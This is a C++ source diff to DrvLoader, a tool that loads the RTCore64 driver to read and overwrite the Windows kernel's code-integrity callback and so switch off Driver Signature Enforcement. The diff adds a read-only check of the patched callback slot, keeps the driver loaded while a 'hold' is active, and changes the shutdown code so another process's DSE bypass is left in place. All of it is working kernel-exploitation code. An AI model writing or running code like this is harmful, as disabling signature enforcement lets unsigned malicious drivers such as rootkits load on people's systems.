@@ -254,12 +254,32 @@ bool DrvLoader::Initialize() {
 }
 
 DrvLoader::~DrvLoader() {
-    if (!originalCallbacks.empty() && !holdMode) {
+    // ------------------------------------------------------------------
+    // Only undo what THIS process did.
+    //
+    // Upstream restored whenever `originalCallbacks` was non-empty, which is
+    // fine when DrvLoader is the only party involved — but `Initialize()`
+    // seeds originalCallbacks from HKCU for *every* command, including
+    // `status`, `compat` and `help`.  With ARTIFACT's hold mode that means any
+    // harmless read-only command silently tears down a DSE hold established by
+    // a *different* process, and destroys the only record of the original
+    // callback values while doing it (observed: `hold` then `status` =>
+    // "[*] DrvLoader shutting down, auto-restoring DSE...").
+    //
+    // `patchedCallbackAddr` is set only by BypassDSEInternal(), i.e. only by a
+    // process that really wrote to the CI table.  Use that as the trigger.
+    // ------------------------------------------------------------------
+    bool patchedByThisProcess = patchedCallbackAddr.has_value();
+
+    if (patchedByThisProcess && !holdMode) {
         std::wcout << L"\n[*] DrvLoader shutting down, auto-restoring DSE...\n";
         RestoreDSE();
     }
-    else if (!originalCallbacks.empty() && holdMode) {
+    else if (patchedByThisProcess && holdMode) {
         std::wcout << L"[*] Hold mode: leaving DSE patched and RTCore64 loaded\n";
+    }
+    else if (!originalCallbacks.empty()) {
+        std::wcout << L"[*] Patch state belongs to another process - leaving it untouched\n";
     }
     Cleanup();
 }
@@ -553,6 +573,18 @@ bool DrvLoader::CheckDriverFileExists() {
     return true;
 }
 
+// True when the given kernel-driver service exists (regardless of state).
+bool DrvLoader::DriverServiceExists(const std::wstring& serviceName) {
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!hSCM) return false;
+
+    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_QUERY_STATUS);
+    bool exists = (hService != nullptr);
+    if (hService) CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+    return exists;
+}
+
 bool DrvLoader::StopAndRemoveDriver() {
     SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
     if (!hSCM) return false;
@@ -630,9 +662,80 @@ bool DrvLoader::InstallAndStartDriver() {
     return true;
 }
 
+// ---------------------------------------------------------------------------
+// ReadDSEOnly
+//
+// Pure-read DSE inspection.  Never installs, uninstalls or patches anything.
+// This is the only safe way to query the live state while a `hold` is in
+// effect: `status` necessarily installs RTCore64 (if absent) and its own
+// destructor restores DSE, so running `status` after `hold` silently undoes
+// the hold.  Verified on this machine: `hold` then `status` => DSE back to
+// ACTIVE and the registry cleared.
+//
+// Returns:
+//   true  -> isPatched is filled in
+//   false -> could not read (RTCore64 absent, symbols unavailable, ...)
+// ---------------------------------------------------------------------------
+bool DrvLoader::ReadDSEOnly(bool& isPatched) {
+    // Requires an already-open handle; do not create one.
+    if (hDriver == INVALID_HANDLE_VALUE) {
+        std::wcout << L"[-] RTCore64 is not open; nothing to read\n";
+        return false;
+    }
+
+    auto offsets = ResolveKernelOffsetsStrict();
+    if (!offsets) {
+        std::wcout << L"[-] Failed to resolve kernel offsets\n";
+        return false;
+    }
+    auto [seCiOffset, zwFlushOffset] = *offsets;
+
+    auto ntBase = GetNtoskrnlBase();
+    if (!ntBase) {
+        std::wcout << L"[-] Failed to get ntoskrnl.exe base\n";
+        return false;
+    }
+
+    if (!ValidateKernelAddresses(*ntBase, seCiOffset, zwFlushOffset)) {
+        std::wcout << L"[-] Address validation failed\n";
+        return false;
+    }
+
+    uint64_t seCiCallbacks = *ntBase + seCiOffset;
+    uint64_t safeFunction  = *ntBase + zwFlushOffset;
+
+    auto cbOff = FindCallbackOffset(seCiCallbacks, *ntBase);
+    if (!cbOff) {
+        std::wcout << L"[-] Could not locate CI callback slot\n";
+        return false;
+    }
+
+    auto current = ReadMemory64(seCiCallbacks + *cbOff);
+    if (!current) {
+        std::wcout << L"[-] Could not read CI callback slot\n";
+        return false;
+    }
+
+    isPatched = (*current == safeFunction);
+    std::wcout << L"    Current callback: 0x" << std::hex << *current << L"\n";
+    std::wcout << L"    Safe function:    0x" << safeFunction << std::dec << L"\n";
+    return true;
+}
+
 bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     std::wcout << L"\n[=== Checking DSE Status ===]\n\n";
-    
+
+    // ------------------------------------------------------------------
+    // Don't disturb an existing hold.
+    //
+    // Upstream's flow was InstallAndStartDriver() -> read -> StopAndRemoveDriver(),
+    // i.e. it (re)installed RTCore64 and then unloaded it again.  When a hold
+    // is active that sequence tears the helper driver out from under the live
+    // patch.  Reuse the handle if we already have one, and never unload a
+    // driver that was already running when we arrived.
+    // ------------------------------------------------------------------
+    bool driverWasAlreadyLoaded = DriverServiceExists(L"RTCore64");
+
     // Strict resolution - no cache
     auto offsets = ResolveKernelOffsetsStrict();
     if (!offsets) {
@@ -642,18 +745,20 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     
     auto [seCiCallbacksOffset, zwFlushOffset] = *offsets;
     
-    if (!InstallAndStartDriver()) return false;
-    
-    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
     if (hDriver == INVALID_HANDLE_VALUE) {
-        StopAndRemoveDriver();
-        return false;
+        if (!InstallAndStartDriver()) return false;
+        hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        if (hDriver == INVALID_HANDLE_VALUE) {
+            if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
+            return false;
+        }
     }
     
     auto ntBase = GetNtoskrnlBase();
     if (!ntBase) {
+        std::wcout << L"[-] Failed to get ntoskrnl.exe base\n";
         Cleanup();
-        StopAndRemoveDriver();
+        if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
         return false;
     }
     
@@ -663,7 +768,7 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     if (!ValidateKernelAddresses(*ntBase, seCiCallbacksOffset, zwFlushOffset)) {
         std::wcout << L"[-] Address validation failed - offsets may be incorrect\n";
         Cleanup();
-        StopAndRemoveDriver();
+        if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
         return false;
     }
     
@@ -675,7 +780,7 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     if (!cbOff) {
         std::wcout << L"[-] Could not locate CI callback slot\n";
         Cleanup();
-        StopAndRemoveDriver();
+        if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
         return false;
     }
     uint64_t callbackAddress = seCiCallbacks + *cbOff;
@@ -683,7 +788,7 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     auto currentCallback = ReadMemory64(callbackAddress);
     if (!currentCallback) {
         Cleanup();
-        StopAndRemoveDriver();
+        if (!driverWasAlreadyLoaded) StopAndRemoveDriver();
         return false;
     }
 
@@ -692,14 +797,28 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     std::wcout << L"[+] DSE Status: " << (isPatched ? L"PATCHED" : L"ACTIVE") << L"\n";
     std::wcout << L"    Current callback: 0x" << std::hex << *currentCallback << L"\n";
     std::wcout << L"    Safe function: 0x" << safeFunction << std::dec << L"\n";
+
+    // Report the boot-scoped state so callers can tell "live patch" from
+    // "stale registry record left over from an earlier boot".
+    if (!originalCallbacks.empty()) {
+        std::wcout << L"    Patch record   : "
+                   << (ArtifactCompat::IsPatchStateFromCurrentBoot() ? L"this boot (live)"
+                                                                    : L"previous boot (stale)")
+                   << L"\n";
+    }
     
     // Update configuration files with validated offsets
     ConfigManager::UpdateDriversIni(seCiCallbacksOffset, zwFlushOffset);
     std::wstring buildInfo = ConfigManager::GetWindowsBuildNumber();
     ConfigManager::SaveOffsetsToRegistry(seCiCallbacksOffset, zwFlushOffset, buildInfo);
     
-    Cleanup();
-    StopAndRemoveDriver();
+    // A hold keeps the helper driver loaded on purpose: leave it alone.
+    if (!holdMode && !driverWasAlreadyLoaded) {
+        Cleanup();
+        StopAndRemoveDriver();
+    } else {
+        std::wcout << L"[*] RTCore64 left loaded (hold active or pre-existing)\n";
+    }
     return true;
 }
 
